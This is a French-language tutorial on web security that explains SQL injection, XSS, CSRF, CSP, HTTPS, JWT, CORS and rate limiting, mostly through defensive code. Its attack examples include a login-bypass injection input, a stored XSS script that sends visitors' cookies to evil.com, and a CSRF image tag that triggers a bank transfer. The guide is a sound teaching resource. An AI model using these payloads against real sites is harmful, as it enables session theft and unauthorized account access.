# Sécurité Web

---

## Vue d'ensemble des attaques et contre-mesures

| Attaque | Description courte | Contre-mesure principale |
|---|---|---|
| Injection SQL | Exécution de SQL arbitraire via les inputs | Requêtes paramétrées |
| XSS | Injection de scripts dans les pages | Échappement du HTML, CSP |
| CSRF | Action frauduleuse au nom d'un utilisateur connecté | Token CSRF, SameSite |
| MITM | Interception du trafic réseau | HTTPS / TLS |
| Brute force | Tentatives massives de connexion | Rate limiting, CAPTCHA |
| Vol de session | Récupération d'un cookie de session | HttpOnly, Secure, SameSite |

---

## Injections SQL

Une injection SQL se produit quand une donnée fournie par l'utilisateur est insérée directement dans une requête SQL sans être nettoyée. L'attaquant peut ainsi modifier la logique de la requête et accéder à des données qu'il ne devrait pas voir, les modifier, voire supprimer la base entière.

### Exemple d'attaque

```sql
-- Requête vulnérable (concaténation directe de l'input)
SELECT * FROM users WHERE email = '$email' AND password = '$password'

-- Input malveillant : email = admin@site.com' --
-- La requête devient :
SELECT * FROM users WHERE email = 'admin@site.com' --' AND password = '...'
-- Le mot de passe n'est plus vérifié !
```

### Bonne pratique : requêtes paramétrées (préparées)

La méthode recommandée est d'utiliser des **placeholders** — la base de données sépare le code SQL des données, rendant l'injection impossible.

```js
// MySQL avec mysql2 (Node.js)
const [rows] = await connection.execute(
  'SELECT * FROM users WHERE email = ? AND password = ?',
  [email, password]
);

// PostgreSQL avec pg (Node.js)
const result = await client.query(
  'SELECT * FROM users WHERE email = $1 AND password = $2',
  [email, password]
);
```

### Fonction d'échappement (approche legacy)

Si vous ne pouvez pas utiliser de requêtes paramétrées, nettoyer l'input avec une fonction d'échappement est une alternative — mais elle reste moins sûre que les requêtes préparées.

```js
function mysqlEscape(stringToEscape){
    if(stringToEscape == '') { return stringToEscape; }
    return stringToEscape
        .replace(/\\/g, "\\\\")
        .replace(/\'/g, "\\\'")
        .replace(/\"/g, "\\\"")
        .replace(/\n/g, "\\\n")
        .replace(/\r/g, "\\\r")
        .replace(/\x00/g, "\\\x00")
        .replace(/\x1a/g, "\\\x1a");
}
```

> Préférer toujours les requêtes paramétrées à l'échappement manuel.

---

## XSS — Cross-Site Scripting

Une attaque XSS injecte du code JavaScript malveillant dans une page web consultée par d'autres utilisateurs. Ce script s'exécute dans le navigateur de la victime et peut voler des cookies, rediriger vers un site frauduleux ou modifier le contenu de la page.

### Types de XSS

| Type | Mécanisme |
|---|---|
| **Stocké** (Stored) | Le script est enregistré en base et affiché à tous les visiteurs |
| **Réfléchi** (Reflected) | Le script est dans l'URL et renvoyé immédiatement dans la réponse |
| **DOM-based** | La page modifie le DOM à partir d'une source non fiable (URL, storage) |

### Exemple d'attaque stockée

```html
<!-- Un attaquant soumet ce commentaire dans un formulaire -->
<script>
  fetch('https://evil.com/steal?c=' + document.cookie);
</script>

<!-- Si le serveur le stocke et l'affiche sans échappement, tous les visiteurs
     envoient leurs cookies à evil.com -->
```

### Contre-mesures

```js
// 1. Échapper les caractères HTML avant d'injecter dans le DOM
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// 2. Utiliser textContent plutôt que innerHTML
element.textContent = userInput; // safe
element.innerHTML = userInput;   // dangereux !
```

---

## CSP — Content Security Policy

Content Security Policy permet d'améliorer la sécurité des sites web en permettant de détecter et réduire certains types d'attaques, dont les attaques XSS (Cross Site Scripting) et les injections de contenu. Pour activer CSP, vous devez configurer vos serveurs web afin d'ajouter un en-tête (header) HTTP `Content-Security-Policy` aux réponses.

### Exemple d'en-tête CSP

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self' https://api.exemple.com; frame-ancestors 'none'
```

### Directives courantes

| Directive | Rôle |
|---|---|
| `default-src` | Fallback pour toutes les ressources |
| `script-src` | Sources autorisées pour les scripts JS |
| `style-src` | Sources autorisées pour les CSS |
| `img-src` | Sources autorisées pour les images |
| `connect-src` | URLs autorisées pour fetch/XHR/WebSocket |
| `frame-ancestors` | Qui peut intégrer la page dans un iframe |

### CSP en balise meta (alternative au header)

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'">
```

> Le header HTTP est préférable à la balise meta car il s'applique avant même que le HTML soit parsé.

---

## CSRF — Cross-Site Request Forgery

Le CSRF (falsification de demande intersite) pousse un utilisateur authentifié à exécuter involontairement une action sur un site où il est connecté. Par exemple, un lien malveillant déclenche un virement bancaire en utilisant le cookie de session déjà présent dans le navigateur.

### Mécanisme de l'attaque

```html
<!-- Page malveillante visitée par la victime -->
<img src="https://bank.exemple.com/transfer?to=attacker&amount=1000" />
<!-- Le navigateur envoie automatiquement les cookies de bank.exemple.com -->
```

### Contre-mesure 1 : token anti-CSRF

Un token aléatoire unique par session est intégré dans chaque formulaire. Le serveur vérifie que la requête contient bien ce token — impossible à deviner pour un site tiers.

```html
<form method="POST" action="/transfer">
  <input type="hidden" name="token_csrf" value="48rtyu9962dd4s3assa" />
  <!-- ... autres champs ... -->
</form>
```

```js
// Vérification côté serveur (exemple Express)
app.post('/transfer', (req, res) => {
  if (req.body.token_csrf !== req.session.csrfToken) {
    return res.status(403).send('Token CSRF invalide');
  }
  // traitement de la requête...
});
```

### Contre-mesure 2 : attribut SameSite sur les cookies

L'attribut `SameSite` contrôle quand les cookies sont envoyés avec les requêtes cross-site.

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

| Valeur | Comportement |
|---|---|
| `SameSite=Strict` | Cookie jamais envoyé depuis un autre site |
| `SameSite=Lax` | Cookie envoyé uniquement sur navigation GET (liens), pas sur POST/img/iframe |
| `SameSite=None` | Cookie toujours envoyé (nécessite `Secure`) |

> `SameSite=Lax` est le défaut dans les navigateurs modernes. `Strict` est le plus sécurisé.

---

## HTTPS, TLS et SSL

### SSL / TLS

- **SSL** (Secure Sockets Layer) : protocole de chiffrement historique, aujourd'hui obsolète et vulnérable.
- **TLS** (Transport Layer Security) : successeur de SSL, version actuelle TLS 1.3 (2018). C'est TLS qui est utilisé partout, même quand on dit "SSL" dans le langage courant.

### HTTPS

**HTTPS** = HTTP + TLS. Le trafic entre le client et le serveur est chiffré, ce qui garantit :
- **Confidentialité** : personne ne peut lire les données en transit (MITM)
- **Intégrité** : les données ne peuvent pas être modifiées en chemin
- **Authentification** : le certificat prouve l'identité du serveur

```http
-- Redirection systématique vers HTTPS
HTTP/1.1 301 Moved Permanently
Location: https://exemple.com/page

-- Header HSTS : forcer HTTPS pour les prochaines visites
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

### Certificats

Les certificats TLS sont délivrés par des **autorités de certification** (CA). [Let's Encrypt](https://letsencrypt.org/) offre des certificats gratuits et automatisés.

---

## Authentification — JWT et Sessions

### Sessions côté serveur

Le serveur crée une session en mémoire (ou en base) et envoie un identifiant de session au client via un cookie.

```http
Set-Cookie: session_id=xyz789; HttpOnly; Secure; SameSite=Lax; Path=/
```

| Avantage | Inconvénient |
|---|---|
| Révocation immédiate possible | État côté serveur (scalabilité difficile) |
| Opaque pour le client | Requiert un store partagé en multi-serveur |

### JWT — JSON Web Token

Un JWT est un token signé contenant des informations (claims) sur l'utilisateur. Le serveur n'a pas besoin de stocker de session — il vérifie juste la signature.

```
header.payload.signature
```

```js
// Structure du payload (décodable, non chiffré par défaut)
{
  "sub": "1234567890",    // subject = identifiant utilisateur
  "name": "Julie",
  "role": "admin",
  "iat": 1716239022,      // issued at
  "exp": 1716242622       // expiration
}
```

```js
// Génération côté serveur (Node.js avec jsonwebtoken)
const jwt = require('jsonwebtoken');

const token = jwt.sign(
  { sub: user.id, role: user.role },
  process.env.JWT_SECRET,
  { expiresIn: '1h' }
);

// Vérification
try {
  const payload = jwt.verify(token, process.env.JWT_SECRET);
  console.log(payload.sub); // ID de l'utilisateur
} catch (err) {
  // Token invalide ou expiré
}
```

| Avantage | Inconvénient |
|---|---|
| Stateless, scalable | Révocation difficile avant expiration |
| Peut contenir des claims utiles | Payload visible (ne pas y mettre de secrets) |
| Standard ouvert (RFC 7519) | Taille supérieure à un ID de session |

> Ne jamais stocker un JWT dans `localStorage` si le site est exposé aux XSS — préférer un cookie `HttpOnly`.

---

## CORS — Cross-Origin Resource Sharing

CORS est un mécanisme de sécurité du navigateur qui bloque par défaut les requêtes HTTP vers un domaine différent de celui de la page. Le serveur doit explicitement autoriser les origines tierces.

### Headers CORS

```http
-- Réponse du serveur autorisant une origine
Access-Control-Allow-Origin: https://app.exemple.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```

### Requête préalable (preflight)

Pour les requêtes non-simples (POST avec JSON, DELETE, headers custom...), le navigateur envoie d'abord une requête `OPTIONS` pour vérifier les autorisations.

```http
OPTIONS /api/users HTTP/1.1
Origin: https://app.exemple.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization
```

### Configuration Express

```js
const cors = require('cors');

app.use(cors({
  origin: ['https://app.exemple.com', 'https://admin.exemple.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,
}));
```

> Ne jamais utiliser `Access-Control-Allow-Origin: *` avec `credentials: true` — les navigateurs le refusent et c'est une faille de sécurité.

---

## Rate Limiting

Le rate limiting limite le nombre de requêtes qu'un client peut effectuer sur une période donnée. Il protège contre les attaques par force brute, le scraping abusif et les dénis de service.

### Exemple avec express-rate-limit

```js
const rateLimit = require('express-rate-limit');

// Limite globale : 100 requêtes par 15 minutes par IP
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: { error: 'Trop de requêtes, réessayez dans 15 minutes.' },
  standardHeaders: true,  // ajoute les headers RateLimit-*
  legacyHeaders: false,
});

// Limite stricte sur le login : 5 tentatives par 15 minutes
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: { error: 'Trop de tentatives de connexion.' },
});

app.use(limiter);
app.post('/login', loginLimiter, authController.login);
```

### Headers de rate limit dans la réponse

```http
RateLimit-Limit: 100
RateLimit-Remaining: 42
RateLimit-Reset: 1716242000
Retry-After: 900
```

### Stratégies complémentaires

- **CAPTCHA** après N tentatives échouées
- **Backoff exponentiel** côté client
- **IP blocking** temporaire ou permanent pour les abus avérés
- **Throttling** par compte utilisateur (pas seulement par IP)
